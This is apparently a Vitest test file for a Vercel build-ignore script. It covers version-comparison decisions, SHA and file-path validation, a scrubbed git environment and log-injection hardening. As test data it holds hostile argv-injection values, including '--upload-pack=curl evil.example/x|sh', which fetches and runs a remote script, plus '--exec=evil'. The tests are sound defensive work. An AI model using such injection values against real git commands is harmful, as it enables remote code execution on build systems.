import path from 'node:path';

import { describe, expect, it } from 'vitest';

import {
  gitFetchShallow,
  gitShowFileAtSha,
  runVercelIgnoreCommand,
  scrubbedGitEnv,
  validateGitSha,
} from '../runtime-only-scripts/vercel-ignore-production-non-release-build.mjs';

/**
 * Tests cover three concerns:
 *
 * 1. ADR-163 §10 truth-table semantics — `runVercelIgnoreCommand` exit-code
 *    behaviour given combinations of branch, current-version resolvability,
 *    and previous-version resolvability.
 * 2. Trust-boundary input validation — `VERCEL_GIT_PREVIOUS_SHA` is
 *    treated as untrusted input from the upstream provider, validated
 *    against `/^[0-9a-f]{40}$/` at the boundary, and never logged in
 *    raw form.
 * 3. Capability-narrow DI surface — `runVercelIgnoreCommand` consumes
 *    two named capabilities (`gitShowFileAtSha`, `gitFetchShallow`),
 *    not a generic `executeGitCommand` runner. The capabilities
 *    re-validate the SHA as defence-in-depth and run `execFileSync`
 *    with a scrubbed environment that neutralises hostile global /
 *    system git config.
 *
 * Aligned with PR-87 architectural cleanup plan §"Phase 1 — Cluster B"
 * and the adversarial security review that surfaced the argv-injection
 * class against `git fetch` / `git show` via leading-`-` SHA values.
 * Cites ADR-024 (DI as named capabilities), ADR-078 (DI for testability),
 * ADR-158 (multi-layer security and rate limiting).
 */

const REPOSITORY_ROOT = '/repo';
// Host form of the root package.json path: the command resolves it against
// the repository root, so the fake's guard must expect the host-joined form
// (drive-prefixed backslash path on Windows, `/repo/package.json` on POSIX).
const ROOT_PACKAGE_JSON_PATH = path.resolve(REPOSITORY_ROOT, 'package.json');
const VALID_SHA = 'a'.repeat(40);
const VALID_SHA_OTHER = 'b1'.repeat(20);

function captureWriter() {
  const chunks = [];
  return {
    write(text) {
      chunks.push(text);
    },
    text: () => chunks.join(''),
  };
}

function packageReadFile(current) {
  return (filePath, encoding) => {
    if (filePath !== ROOT_PACKAGE_JSON_PATH) {
      throw new Error(`Unexpected file path: ${filePath}`);
    }
    if (encoding !== 'utf8') {
      throw new Error(`Unexpected encoding: ${encoding}`);
    }
    if (current === 'MISSING_FILE') {
      throw new Error('ENOENT: no such file');
    }
    if (current === 'INVALID_JSON') {
      return '{ not-json';
    }
    if (current === 'MISSING_VERSION') {
      return JSON.stringify({});
    }
    return JSON.stringify({ version: current });
  };
}

function queuedGitShow(...outcomes) {
  const queue = [...outcomes];
  const calls = [];
  const fn = (sha, filePath, cwd) => {
    calls.push({ sha, filePath, cwd });
    const outcome = queue.shift();
    if (!outcome) {
      throw new Error('gitShowFileAtSha called with no remaining outcomes');
    }
    if (outcome.kind === 'throw') {
      throw new Error(outcome.message);
    }
    return outcome.text;
  };
  fn.calls = calls;
  return fn;
}

/** A capability fake that must never be reached; when it is, it names itself and the reason. */
function unexpectedCall(capability, reason) {
  return () => {
    throw new Error(`${capability} should not be called ${reason}`);
  };
}

function queuedGitFetch(...outcomes) {
  const queue = [...outcomes];
  const calls = [];
  const fn = (sha, cwd) => {
    calls.push({ sha, cwd });
    const outcome = queue.shift();
    if (!outcome) {
      throw new Error('gitFetchShallow called with no remaining outcomes');
    }
    if (outcome.kind === 'throw') {
      throw new Error(outcome.message);
    }
    return outcome.text ?? '';
  };
  fn.calls = calls;
  return fn;
}

describe('validateGitSha — trust-boundary input gate', () => {
  it('accepts a 40-character lowercase hex string', () => {
    expect(validateGitSha(VALID_SHA)).toBe(VALID_SHA);
    expect(validateGitSha(VALID_SHA_OTHER)).toBe(VALID_SHA_OTHER);
    expect(validateGitSha('0123456789abcdef0123456789abcdef01234567')).toBe(
      '0123456789abcdef0123456789abcdef01234567',
    );
  });

  it('rejects argv-injection-shaped values that begin with a dash', () => {
    expect(validateGitSha('--upload-pack=evil')).toBeNull();
    expect(validateGitSha('-x')).toBeNull();
    expect(validateGitSha(`-${'a'.repeat(39)}`)).toBeNull();
  });

  it('rejects values that are too short or too long', () => {
    expect(validateGitSha('')).toBeNull();
    expect(validateGitSha('a'.repeat(39))).toBeNull();
    expect(validateGitSha('a'.repeat(41))).toBeNull();
  });

  it('rejects non-hex content', () => {
    expect(validateGitSha('..')).toBeNull();
    expect(validateGitSha(`${'a'.repeat(39)}g`)).toBeNull();
    expect(validateGitSha(`${'a'.repeat(39)} `)).toBeNull();
    expect(validateGitSha(`${'a'.repeat(39)}\n`)).toBeNull();
  });

  it('rejects uppercase hex (Vercel emits SHA-1 lowercase; uppercase is normalised drift)', () => {
    expect(validateGitSha('A'.repeat(40))).toBeNull();
    expect(validateGitSha(`${'a'.repeat(39)}A`)).toBeNull();
  });

  it('rejects non-string inputs', () => {
    expect(validateGitSha(undefined)).toBeNull();
    expect(validateGitSha(null)).toBeNull();
    expect(validateGitSha(123)).toBeNull();
  });
});

describe('scrubbedGitEnv — defence-in-depth env construction', () => {
  it('does NOT include PATH — the production capabilities invoke git via a fixed absolute path so PATH never participates in binary lookup (closes S4036)', () => {
    const env = scrubbedGitEnv();
    expect(env.PATH).toBeUndefined();
  });

  it('pins git global and system config to /dev/null so hostile gitconfig cannot influence the build', () => {
    const env = scrubbedGitEnv();
    expect(env.GIT_CONFIG_GLOBAL).toBe('/dev/null');
    expect(env.GIT_CONFIG_SYSTEM).toBe('/dev/null');
  });

  it('disables interactive credential prompting', () => {
    const env = scrubbedGitEnv();
    expect(env.GIT_TERMINAL_PROMPT).toBe('0');
  });

  it('omits HOME so git cannot read ~/.gitconfig from a hostile home directory', () => {
    const env = scrubbedGitEnv();
    expect(env.HOME).toBeUndefined();
  });

  it('returns exactly three scrubbed keys — no inherited env can sneak through (whole-object equality)', () => {
    // The function takes no input, so there is nothing to "leak through" —
    // this assertion is the structural guarantee that the contract is
    // exactly { GIT_CONFIG_GLOBAL, GIT_CONFIG_SYSTEM, GIT_TERMINAL_PROMPT }.
    expect(scrubbedGitEnv()).toStrictEqual({
      GIT_CONFIG_GLOBAL: '/dev/null',
      GIT_CONFIG_SYSTEM: '/dev/null',
      GIT_TERMINAL_PROMPT: '0',
    });
  });
});

describe('gitShowFileAtSha — capability-internal SHA validation (defence-in-depth)', () => {
  it('throws on a SHA that does not match the canonical 40-char-hex pattern', () => {
    expect(() => gitShowFileAtSha('--upload-pack=evil', 'package.json', REPOSITORY_ROOT)).toThrow(
      /invalid git sha/i,
    );
    expect(() => gitShowFileAtSha('a'.repeat(39), 'package.json', REPOSITORY_ROOT)).toThrow(
      /invalid git sha/i,
    );
  });
});

describe('gitShowFileAtSha — filePath defence-in-depth (latent reuse hardening)', () => {
  it('rejects a leading-dash filePath (would be reinterpreted by git as an argv flag)', () => {
    expect(() => gitShowFileAtSha(VALID_SHA, '-rf', REPOSITORY_ROOT)).toThrow(/invalid filePath/i);
    expect(() => gitShowFileAtSha(VALID_SHA, '--exec=evil', REPOSITORY_ROOT)).toThrow(
      /invalid filePath/i,
    );
  });

  it('rejects a filePath containing newline (log-injection vector)', () => {
    expect(() => gitShowFileAtSha(VALID_SHA, 'package.json\n', REPOSITORY_ROOT)).toThrow(
      /invalid filePath/i,
    );
    expect(() => gitShowFileAtSha(VALID_SHA, 'a\rb', REPOSITORY_ROOT)).toThrow(/invalid filePath/i);
  });

  it('rejects an empty or non-string filePath', () => {
    expect(() => gitShowFileAtSha(VALID_SHA, '', REPOSITORY_ROOT)).toThrow(/invalid filePath/i);
    expect(() => gitShowFileAtSha(VALID_SHA, undefined, REPOSITORY_ROOT)).toThrow(
      /invalid filePath/i,
    );
  });
});

describe('gitFetchShallow — capability-internal SHA validation (defence-in-depth)', () => {
  it('throws on a SHA that does not match the canonical 40-char-hex pattern', () => {
    expect(() => gitFetchShallow('--upload-pack=evil', REPOSITORY_ROOT)).toThrow(
      /invalid git sha/i,
    );
    expect(() => gitFetchShallow('a'.repeat(41), REPOSITORY_ROOT)).toThrow(/invalid git sha/i);
  });
});

describe('runVercelIgnoreCommand — ADR-163 §10 truth table', () => {
  it('row 1: branch !== main → continues without consulting git or the file system', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const readFile = unexpectedCall('readFile', 'when branch is not main');
    const fakeGitShow = unexpectedCall('gitShowFileAtSha', 'when branch is not main');
    const fakeGitFetch = unexpectedCall('gitFetchShallow', 'when branch is not main');

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'feat/otel_sentry_enhancements',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile,
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stdout.text()).toContain('not main');
    expect(stderr.text()).toBe('');
  });

  it('row 2: main, current resolvable, previous unresolvable (sha unset) → continues (first build)', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow();
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.5.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stdout.text()).toContain('Continuing production build');
    expect(stdout.text()).toContain('current=1.5.0');
    expect(stdout.text()).toContain('previous=unknown (treating as first build)');
    expect(fakeGitShow.calls).toStrictEqual([]);
    expect(fakeGitFetch.calls).toStrictEqual([]);
    expect(stderr.text()).toBe('');
  });

  it('row 3: main, current === previous → CANCELS (version did not advance)', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow({
      kind: 'return',
      text: JSON.stringify({ version: '1.5.0' }),
    });
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.5.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 0 });
    expect(stdout.text()).toContain('Cancelling production build');
    expect(stdout.text()).toContain('1.5.0 did not advance beyond previous deployed version 1.5.0');
    expect(fakeGitShow.calls).toStrictEqual([
      { sha: VALID_SHA, filePath: 'package.json', cwd: REPOSITORY_ROOT },
    ]);
    expect(fakeGitFetch.calls).toStrictEqual([]);
    expect(stderr.text()).toBe('');
  });

  it('row 3 variant: main, current < previous (regression) → CANCELS', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow({
      kind: 'return',
      text: JSON.stringify({ version: '1.5.0' }),
    });
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.4.9'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 0 });
    expect(stdout.text()).toContain('Cancelling production build');
    expect(stdout.text()).toContain('1.4.9 did not advance beyond previous deployed version 1.5.0');
    expect(stderr.text()).toBe('');
  });

  it('row 4: main, current > previous → continues (semantic-release advanced the version)', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow({
      kind: 'return',
      text: JSON.stringify({ version: '1.5.0' }),
    });
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.6.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stdout.text()).toContain('Continuing production build');
    expect(stdout.text()).toContain('current=1.6.0');
    expect(stdout.text()).toContain('previous=1.5.0');
    expect(stderr.text()).toBe('');
  });

  it('row 5: main, current unresolvable → CANCELS with stderr diagnostic', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = unexpectedCall('gitShowFileAtSha', 'when current is unresolvable');
    const fakeGitFetch = unexpectedCall('gitFetchShallow', 'when current is unresolvable');

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('MISSING_VERSION'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 0 });
    expect(stderr.text()).toContain(
      'The current app version could not be determined from the root package.json file',
    );
    expect(stderr.text()).toContain('cancelling');
    expect(stdout.text()).toBe('');
  });

  it('row 5 variant: main, package.json read throws → CANCELS with read diagnostic AND cancellation diagnostic', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('MISSING_FILE'),
      gitShowFileAtSha: queuedGitShow(),
      gitFetchShallow: queuedGitFetch(),
    });

    expect(result).toStrictEqual({ exitCode: 0 });
    expect(stderr.text()).toContain('Current-version probe: package.json read failed');
    expect(stderr.text()).toContain('ENOENT');
    expect(stderr.text()).toContain('cancelling');
    expect(stdout.text()).toBe('');
  });

  it('row 5 variant: main, package.json invalid JSON → CANCELS with parse diagnostic AND cancellation diagnostic', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('INVALID_JSON'),
      gitShowFileAtSha: queuedGitShow(),
      gitFetchShallow: queuedGitFetch(),
    });

    expect(result).toStrictEqual({ exitCode: 0 });
    expect(stderr.text()).toContain('Current-version probe: package.json parse failed');
    expect(stderr.text()).toContain('cancelling');
    expect(stdout.text()).toBe('');
  });

  it('row 2 variant: main, previous resolvable-via-fetch-fallback → runs fetch then re-shows, continues when current > previous', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow(
      { kind: 'throw', message: 'fatal: bad object ' + VALID_SHA },
      { kind: 'return', text: JSON.stringify({ version: '1.5.0' }) },
    );
    const fakeGitFetch = queuedGitFetch({ kind: 'return', text: '' });

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.6.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(fakeGitShow.calls).toStrictEqual([
      { sha: VALID_SHA, filePath: 'package.json', cwd: REPOSITORY_ROOT },
      { sha: VALID_SHA, filePath: 'package.json', cwd: REPOSITORY_ROOT },
    ]);
    expect(fakeGitFetch.calls).toStrictEqual([{ sha: VALID_SHA, cwd: REPOSITORY_ROOT }]);
    expect(stdout.text()).toContain('Continuing production build');
    expect(stdout.text()).toContain('current=1.6.0');
    expect(stdout.text()).toContain('previous=1.5.0');
    // The first show throw is observable as a stderr diagnostic — the fail-open
    // posture per ADR-163 §10 is intentional, but it MUST be observable in
    // build logs, not silent. The cure of fail-open silence is one of the
    // adversarial-security-review's hardening findings.
    expect(stderr.text()).toContain('Previous-version probe');
  });

  it('row 2 variant: main, previous unresolvable even after fetch-fallback → continues with stderr diagnostic (fail-open made observable)', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow({
      kind: 'throw',
      message: 'fatal: bad object ' + VALID_SHA,
    });
    const fakeGitFetch = queuedGitFetch({
      kind: 'throw',
      message: 'fatal: could not read from remote repository',
    });

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.6.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stdout.text()).toContain('Continuing production build');
    expect(stdout.text()).toContain('previous=unknown (treating as first build)');
    expect(stderr.text()).toContain('Previous-version probe');
    expect(stderr.text()).toContain('could not read from remote repository');
  });
});

describe('runVercelIgnoreCommand — boundary validation of VERCEL_GIT_PREVIOUS_SHA', () => {
  it('treats a leading-dash hostile sha as if previous were unset, emits a length+reason stderr diagnostic, never logs the value', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const hostile = '--upload-pack=curl evil.example/x|sh';
    const fakeGitShow = unexpectedCall('gitShowFileAtSha', 'when previous sha is invalid');
    const fakeGitFetch = unexpectedCall('gitFetchShallow', 'when previous sha is invalid');

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: hostile,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.6.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stdout.text()).toContain('Continuing production build');
    expect(stdout.text()).toContain('previous=unknown (treating as first build)');
    expect(stderr.text()).toContain('VERCEL_GIT_PREVIOUS_SHA');
    expect(stderr.text()).toContain(`length=${hostile.length}`);
    // Length + reason gives operators enough context to act without the
    // raw bytes ever entering the log.
    expect(stderr.text()).toContain('reason=wrong-length');
    // The hostile string itself MUST NOT appear in any output stream —
    // attacker-controlled values must never be logged raw, per the
    // adversarial-security-review's log-injection hardening.
    expect(stderr.text()).not.toContain(hostile);
    expect(stdout.text()).not.toContain(hostile);
  });

  it('classifies a 40-char leading-dash hostile sha as reason=leading-dash', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const hostile = `-${'a'.repeat(39)}`;

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: hostile,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.6.0'),
      gitShowFileAtSha: queuedGitShow(),
      gitFetchShallow: queuedGitFetch(),
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stderr.text()).toContain(`length=${hostile.length}`);
    expect(stderr.text()).toContain('reason=leading-dash');
    expect(stderr.text()).not.toContain(hostile);
  });

  it('classifies an uppercase 40-char hex string as reason=uppercase-hex', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const upper = 'A'.repeat(40);

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: upper,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.6.0'),
      gitShowFileAtSha: queuedGitShow(),
      gitFetchShallow: queuedGitFetch(),
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stderr.text()).toContain('length=40');
    expect(stderr.text()).toContain('reason=uppercase-hex');
  });

  it('rejects a too-short sha at the boundary with reason=wrong-length', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const tooShort = 'abc1234';
    const fakeGitShow = unexpectedCall('gitShowFileAtSha', 'when previous sha is invalid');
    const fakeGitFetch = unexpectedCall('gitFetchShallow', 'when previous sha is invalid');

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: tooShort,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.6.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stderr.text()).toContain('VERCEL_GIT_PREVIOUS_SHA');
    expect(stderr.text()).toContain(`length=${tooShort.length}`);
    expect(stderr.text()).toContain('reason=wrong-length');
    expect(stderr.text()).not.toContain(tooShort);
  });

  it('treats whitespace-only sha as unset (mirrors trimToUndefined semantics) and does not emit a validation diagnostic', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow();
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: '   ',
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.6.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stdout.text()).toContain('previous=unknown (treating as first build)');
    expect(stderr.text()).toBe('');
    expect(fakeGitShow.calls).toStrictEqual([]);
  });
});

/**
 * MCP-479 — a redeploy of the commit already in production must build.
 *
 * The §10 truth table cancels any production build whose version has not
 * advanced. That is right for a NEW commit on main, but it also cancelled
 * the operator action needed to recover from a bad deployment environment:
 * rebuilding the commit already in production. On 2026-08-03 a production
 * outage caused by a dangling environment-variable record could not be
 * cured by redeploying — the guard cancelled the rebuild — and recovery
 * needed a release cut. Instant Rollback is no substitute: it re-points
 * domains at an existing build and carries the same stale environment
 * binding, and never runs this script at all.
 *
 * Vercel exposes no variable distinguishing a redeploy from a push, so the
 * signal is derived from two documented ones: `VERCEL_GIT_PREVIOUS_SHA` is
 * "the git SHA of the last successful deployment for the project and
 * branch", so when it equals `VERCEL_GIT_COMMIT_SHA` the build IS a rebuild
 * of the already-released commit and cannot be a non-release build.
 */
describe('runVercelIgnoreCommand — redeploy of the already-deployed commit (MCP-479)', () => {
  it('continues when the commit being built is the last successfully deployed commit, without consulting git', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow();
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_COMMIT_SHA: VALID_SHA,
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.5.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 1 });
    expect(stdout.text()).toContain('redeploy');
    expect(stdout.text()).toContain('1.5.0');
    // The previous version is irrelevant once the commit is known to be the
    // deployed one, so no git subprocess should be spawned to read it.
    expect(fakeGitShow.calls).toStrictEqual([]);
    expect(fakeGitFetch.calls).toStrictEqual([]);
    expect(stderr.text()).toBe('');
  });

  it('still cancels a DIFFERENT commit whose version has not advanced — the guard keeps its purpose', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow({
      kind: 'return',
      text: JSON.stringify({ version: '1.5.0' }),
    });
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_COMMIT_SHA: VALID_SHA_OTHER,
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.5.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 0 });
    expect(stdout.text()).toContain('Cancelling production build');
  });

  it('behaves exactly as before when VERCEL_GIT_COMMIT_SHA is absent, so an unverified variable cannot change the verdict', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow({
      kind: 'return',
      text: JSON.stringify({ version: '1.5.0' }),
    });
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.5.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 0 });
    expect(stdout.text()).toContain('Cancelling production build');
  });

  it('refuses a malformed VERCEL_GIT_COMMIT_SHA at the trust boundary and never echoes its bytes', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const hostileSha = `--upload-pack=${'x'.repeat(26)}`;
    const fakeGitShow = queuedGitShow({
      kind: 'return',
      text: JSON.stringify({ version: '1.5.0' }),
    });
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_COMMIT_SHA: hostileSha,
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('1.5.0'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 0 });
    expect(stdout.text()).toContain('Cancelling production build');
    expect(stderr.text()).toContain('VERCEL_GIT_COMMIT_SHA failed boundary validation');
    expect(stderr.text()).toContain('reason=leading-dash');
    expect(stderr.text()).not.toContain('upload-pack');
  });

  it('cancels ahead of the redeploy allowance when the current version is unresolvable, because that is a repo defect', () => {
    const stdout = captureWriter();
    const stderr = captureWriter();
    const fakeGitShow = queuedGitShow();
    const fakeGitFetch = queuedGitFetch();

    const result = runVercelIgnoreCommand({
      repositoryRoot: REPOSITORY_ROOT,
      env: {
        VERCEL_GIT_COMMIT_REF: 'main',
        VERCEL_GIT_COMMIT_SHA: VALID_SHA,
        VERCEL_GIT_PREVIOUS_SHA: VALID_SHA,
      },
      stdout,
      stderr,
      readFile: packageReadFile('MISSING_VERSION'),
      gitShowFileAtSha: fakeGitShow,
      gitFetchShallow: fakeGitFetch,
    });

    expect(result).toStrictEqual({ exitCode: 0 });
    expect(stderr.text()).toContain('current app version could not be determined');
  });
});

/** Drives the main-branch decision for one (current, previous) version pair. */
function decide(currentVersion, previousVersion) {
  const stdout = captureWriter();
  const stderr = captureWriter();
  const result = runVercelIgnoreCommand({
    repositoryRoot: REPOSITORY_ROOT,
    env: { VERCEL_GIT_COMMIT_REF: 'main', VERCEL_GIT_PREVIOUS_SHA: VALID_SHA },
    stdout,
    stderr,
    readFile: packageReadFile(currentVersion),
    gitShowFileAtSha: queuedGitShow({
      kind: 'return',
      text: JSON.stringify({ version: previousVersion }),
    }),
    gitFetchShallow: queuedGitFetch(),
  });
  return { exitCode: result.exitCode, stdout: stdout.text(), stderr: stderr.text() };
}

describe('runVercelIgnoreCommand — semver §2 grammar and §11 precedence at the version boundary', () => {
  it.each([
    ['1.6.0-rc.2', '1.6.0-rc.1', 'a later prerelease identifier'],
    ['1.6.0-rc.10', '1.6.0-rc.9', 'a numerically later prerelease identifier'],
    ['1.6.0', '1.6.0-rc.1', 'the release after its prerelease'],
    ['1.6.0-rc.1.1', '1.6.0-rc.1', 'a longer prerelease sharing the prefix'],
    ['1.6.0-beta-2', '1.6.0-alpha-9', 'a prerelease identifier carrying a hyphen'],
    ['1.6.0+build.7', '1.5.0', 'build metadata on the advancing side'],
  ])('continues when %s advances beyond %s (%s)', (current, previous) => {
    const decision = decide(current, previous);
    expect(decision.exitCode).toBe(1);
    expect(decision.stdout).toContain(`current=${current}, previous=${previous}`);
  });

  it.each([
    ['1.6.0+build.2', '1.6.0+build.1', 'build metadata carries no precedence'],
    ['1.6.0-rc.1', '1.6.0', 'a prerelease precedes its release'],
    ['1.6.0-rc.1', '1.6.0-rc.1+sha.abc', 'build metadata on the deployed side'],
    ['1.6.0-alpha', '1.6.0-alpha.1', 'a shorter prerelease sharing the prefix'],
  ])('cancels when %s does not advance beyond %s (%s)', (current, previous) => {
    const decision = decide(current, previous);
    expect(decision.exitCode).toBe(0);
    expect(decision.stdout).toContain(
      `${current} did not advance beyond previous deployed version ${previous}`,
    );
  });

  it.each(['v1.6.0', '1.6', '01.6.0', '1.6.0-', '1.6.0+', '1.6.0-rc..1', '1.6.0-rc+', 'latest'])(
    'cancels as unresolvable when the current version %s is not strict semver',
    (current) => {
      const decision = decide(current, '1.5.0');
      expect(decision.exitCode).toBe(0);
      expect(decision.stderr).toContain('could not be determined');
    },
  );

  it.each(['v1.5.0', '1.5', '1.5.0-', '1.5.0+build+2'])(
    'treats a previous version %s that is not strict semver as unset and continues',
    (previous) => {
      const decision = decide('1.6.0', previous);
      expect(decision.exitCode).toBe(1);
      expect(decision.stdout).toContain('previous=unknown (treating as first build)');
    },
  );
});
